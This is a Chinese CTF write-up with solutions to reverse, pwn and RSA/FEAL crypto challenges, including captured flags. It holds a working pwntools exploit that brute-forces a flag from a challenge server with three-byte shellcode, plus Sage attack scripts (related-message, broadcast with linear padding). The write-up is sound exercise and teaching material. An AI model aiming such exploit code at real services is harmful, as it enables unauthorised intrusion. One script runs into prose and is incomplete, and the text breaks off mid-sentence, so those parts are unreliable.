        cat flag
最终化简是`x**3+y**3==z**3+42`
想起了中科大的某道数学题的第一小题
`x, y , z = (80435758145817515, 12602123297335631, 80538738812075974)`
### childRE
c++符号修饰  
UnDecorateSymbolName反修饰后会变成`private: char * __thiscall
R0Pxx::My_Aut0_PWN(unsigned char *)`
网上百度修饰资料
`?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z`  
发现应该是上面  
但是程序对输入进行一次换位  
所以整回来`Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP`就是输入
## PWN
### three
三字节shellcode执行权限，v3其实就是flag。。。写对比控制v5，最后是用mov eax，edx来的爆破。
exp:
    from pwn import *
    name_addr=0x080F6CC0
    context(os='linux',arch='i386')
    jmp='''
    mov eax,edx
    ret
    '''
    jm=asm(jmp)
    flag=''
    to_fxxk=0
    print hex(len(jm))
    while True:
        for i in range(0x10,0x200):
            r=remote('47.104.190.38',12001)
            r.recvuntil(' index:')
            r.sendline(str(to_fxxk))
            r.recvuntil('y much!')
            r.send(jm)
            r.recvuntil('f size:')
            r.sendline(str(i))
            r.recvuntil('me:')
            r.send('a')
            r.recvline()
            leak=int(r.recv(1),10)
            print leak
            print i
            if leak == 1:
                flag+=chr(i-1)
                to_fxxk+=1
                if i-1==ord('}'):
                    pause()
                print flag
                break
            r.close()
## Crypto
### Related
msg = pad(flag)，48字节长，384位。
s0, s1, s2 = msg的低128位，中128位，高128位。
给了  
其中  
要求的是s0, s1, s2。
* * *
由题名`Related`想到了ctfwiki上的[Related Message Attack](https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_coppersmith_attack-zh/#related-message-attack)。
不过这一题显然要更复杂一点。
好在wiki这个栏目的下面给出了拓展阅读：
paper: 
找到了一个推广的结论
一边翻SageMath文档，一边写的exp：
    n = 16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498205967870181640370981402627360812251649
    s = 280513550110197745829890567436265496990
    c1 = 10607235400098586699994392584841806592000660816191315008947917773605476365884572056544621466807636237415893192966935651590312237598366247520986667580174438232591692369894702423377081613821241343307094343575042030793564118302488401888197517625333923710172738913771484628557310164974384462856047065486913046647133386246976457961265115349103039946802386897315176633274295410371986422039106745216230401123542863714301114753239888820442112538285194875243192862692290859625788686421276234445677411280606266052059579743874849594812733193363406594409214632722438592376518310171297234081555028727538951934761726878443311071990
    c2 = 2665348075952836665455323350891842781938471372943896177948046901127648217780657532963063228780230203325378931053293617434754585479452556620021360669764370971665619743473463613391689402725053682169256850873752706252379747752552015341379702582040497607180172854652311649467878714425698676142212588380080361100526614423533767196749274741380258842904968147508033091819979042560336703564128279527380969385330845759998657540777339113519036552454829323666242269607225156846084705957131127720351868483375138773025602253783595007177712673092409157674720974653789039702431795168654387038080256838321255342848782705785524911705
    c3 = 4881225713895414151830685259288740981424662400248897086365166643853409947818654509692299250960938511400178276416929668757746679501254041354795468626916196040017280791985239849062273782179873724736552198083211250561192059448730545500442981534768431023858984817288359193663144417753847196868565476919041282010484259630583394963580424358743754334956833598351424515229883148081492471874232555456362089023976929766530371320876651940855297249474438564801349160584279330339012464716197806221216765180154233949297999618011342678854874769762792918534509941727751433687189532019000334342211838299512315478903418642056097679717
    R. = Zmod(n)[]
    I = ideal(x + y + z - s, x^17 - c1, y^17 - c2, z^17 - c3)
    res = I.groebner_basis()
    m1 = n - long(res[0] - x)
    m2 = n - long(res[1] - y)
    m3 = n - long(res[2] - z)
    m = (long(m3 paper看的快，拿了一血
>
> 赛后对比[官网wp](https://mp.weixin.qq.com/s/MKaMMihP8gPSYKswAxjNqQ)，发现其实只要`s0, s1,
> s2`和`s = s0+s1+s2`这四个关系式即可解出，并不需要s3。
### Broadcast
附件给错了，打开`task.py`直接获得flag
flag{fa0f8335-ae80-448e-a329-6fb69048aae4}
> 手速快，又拿了一血
### 精明的Alice
题目名字说是Broadcast，实际上并不是简单的广播攻击。
简单的广播攻击，前提是对同一个m加密：
在这一题里，显然每一次的`m`都不一样，而且`e=3`的时候，就2个其他用户（明密文对）。
每一次的m都是由
  1. from Alice (每次都相同)
  2. to name（每次都不同）
  3. msg (每次都相同)
生成，其中 **只有**`'to' : name`会变。
又由于有一个`data = json.dumps(data,
sort_keys=True)`，会根据这个`data`字典的`key`来排序，使得最终的`data`变成了：
> `name`用的`Bob`，`msg`（试验）选择的是95个'1'
可以发现，msg会被排序至中间这个位置。
`m = high + mid + low`
`high`就是对应的`'from' : Alice`， `mid`就是对应的`'msg' : msg`，`low`就是对应的`'to' : name`。
每一个`m`的 **高、中位** 都是不变的，只不过 **低位** 变了而已。
* * *
`high`和`low`都是已知(可以算出来）的，我们想要求的东西，就是这个`mid`。
这就让我想到了之前SCTF的一道[Broadcast Attack with Linear
Padding](http://www.soreatu.com/ctf/writeups/Writeup%20for%20babygame%20in%202019%20SCTF.html)。
我们可以把每一次的`m`看成
其中
且x仅为95*8=760位。
利用[Broadcast Attack with Linear
Padding](https://en.wikipedia.org/wiki/Coppersmith%27s_attack#Generalizations)
可以算出多项式
的`small root`。
> `small
> root`要求是要小于模数`n`的`1/e`次方，而`x`为760位，760*3=2280>2048=1024*2，所以需要用到两组加密使模数的位数增大为4096位，使得760位的x能够是`small
> root`。
sage:
    from functools import reduce
    n = [11743537468135317101480488020144809201914936988461977176868954193874417724397531738707729413940060004291802011501577549223271797288223565654061393379024948557114873802484065401046235691942131446370168987779343797500311519782297945918303703564655987952282482715476136773764831205732478344688915636069116516770855051840466960976764092858799500910720099908106249684080240663853178927556249049193503151085654884527269002477666950572742679984293662085069728877459286849951188181117702216469759179036558783079196215512501682142798495265635852347494193629555160491782509569392767123686061925883459482937083314597325931324903,
        14457209969884668177708697333084651442256193118762305783886170334587420837310297145702128170106972242068185696834421424217621080232658721763477597612126355466640947700608787202555955170003838596141926637700553638034795412618607691704863949191711837596504911369550275265047485577345602266210861036695691235637536527380239331718278464709412846966181787795995822367966392084870050879397930114908541580226650851547317522603090899886280170245299959983054236157294287800393659291904879499563552223080590816177114742527572796924746954499447982388532224932540152177949556088321209870823140903366811600475984145194404542130227]
    c = [8190049298225986645065639656298172597926128706450768371303258134744480067344252838541490888036183464705944304534788993901104793815361341756431217860700928158019252752618919437673052832128577726977953950790902559970309709239504865249701468783648614158118356226876181834829777260079340923537145106302704145961190836661375363413110097880213997662546161624163926197325967768410253429584704238310212909716376684130921549808859640649278922277248496022978656354003386568276074858346316327173050731369576404526308212891898482132494538059251451015302281630189059974681450654073047538089109981563439870031087270051532901896822,
        12118101166054737713386215385862569765107262982956699621223784645643668203345111850159614142861485707244381466506582226100758646240135249724760825645393433062905277245716757630096083674730526877271237776864887538290354358982569685278734177038607779153674199245850037034568957234569159850767151815484600506473286544739506911281943726669304436835800686344966600632518764992677531015390701093253398220813342080495059893716294823513371481710159387645437923515728187314225175839309059255201792376404426500260584133880852811820804606509557432184294402579927159295465411669899092463872169344366863225658285149101653314280770]
    a = [1, 1]
    # b_i = high + low_i
    b=[15544274873612998989866379328566946388285248570806564503108352867340017880252665817613208325183832507901409765669821491355202065667225050801744228447515864518584620720787409961012061302114074543857882368586098987225919736280924738224995075370843988377198544539266275729089636607095220506662375139381261384398438998662059177913249680151096549632879238896603189241688956490787338355571799212913598318011639865738648621731434747681682396930715043552472778331701738091587062917693835229391950847730617837543337471998802061973389340720433170042633451884844390746043635079083497185464124715717119052915013438803576714502781,
       15544274873612998989866379328566946388285248570806564503108352867340017880252665817613208325183832507901409765669821491355202065667225050801744228447515864518584620720787409961012061302114074543857882368586098987225919736280924738224995075370843988377198544539266275729089636607095220506662375139381261384398438998662059177913249680151096549632879238896603189241688956490787338355571799212913598318011639865738648621731434747681682396930715043552472778331701733991049485714120357663081338580983163588987883815040112341393183479429685436337175694444720513269496978577270272192766705854550355666404326847416678342795901]
    def chinese_remainder(n, a):
        sum = 0
        prod = reduce(lambda a, b: a * b, n)
        for n_i, a_i in zip(n, a):
            p = prod // n_i
            sum += a_i * inverse_mod(p, n_i) * p
        return int(sum % prod)
    T = []
    T.append(chinese_remainder([n[0],n[1]],[1,0]))
    T.append(chinese_remainder([n[1],n[0]],[1,0]))
    N = n[0]*n[1]
    P. = PolynomialRing(Zmod(N))
    g=0
    for i in range(2):
        g += ((a[i]*x *2^608 + b[i])^3 - c[i])*T[i]
    g = g.monic()
    x = g.small_roots()[0]
    print x
    print hex(long(x))[2:].strip('L').decode('hex')
    # 1714661166087377473014475529806516832214035482305327415277479703776481564871479523924321275498885242003713793314464965569235093750357822116766965311615937698169583931123673327349849371866141948995747458407120138743748898874096942
    # Hahaha, Hastad's method don't work on this. Flag is flag{6b6c9731-5189-4937-9ead-310494b8f05b}.
flag{6b6c9731-5189-4937-9ead-310494b8f05b}
> 话说，`msg`的内容和给错附件的那道基本上差不多，就flag内容不同。直接把flag括号里的内容当成未知量(仅286位)，一组加密直接求`small
> root`就可以完事了。
>
> 这题出题人肯定没想到`Hastad's
> method`仍然适用，只需要2组e=3的加密就可以解出来，而并不需要像官方wp那样需要2组e=3的加密和2组e=5的加密才能解。
>
> 为了看比赛，又双叒叕拿了一血。 fpxnb！
### Boom
> 这一题比赛的时候没有做出来，否则我们队就第一了。。
赛后去稍微看了一下`Differential
Cryptoanalysis`，再结合[官网wp](https://mp.weixin.qq.com/s/MKaMMihP8gPSYKswAxjNqQ)里的关键词`Boomerang
Attack`，学习了一下，才做出来。
* * *
`task.py`文件中，主要看下面这两个加密和解密的函数。
很像是`CBC`模式，但是在经过`Feal6`后又多了一次异或操作。
> 画了2个简略图
`encrypt`函数：
`decrypt`函数
从中，不难推出如何获取任意的`c = Feal6.encrypt(m)`和`m = Feak6.decrypt(c)`。
> 注意区分task.py文件中的`encrypt`函数和`Feal6.encrypt`函数！
想要获得任意`m`被`Feal6`加密后的密文`c`，只需：
**第一次** 先发过去`b'\x00' * 32`经过`encrypt`函数，得到`p1 = b'\x00' *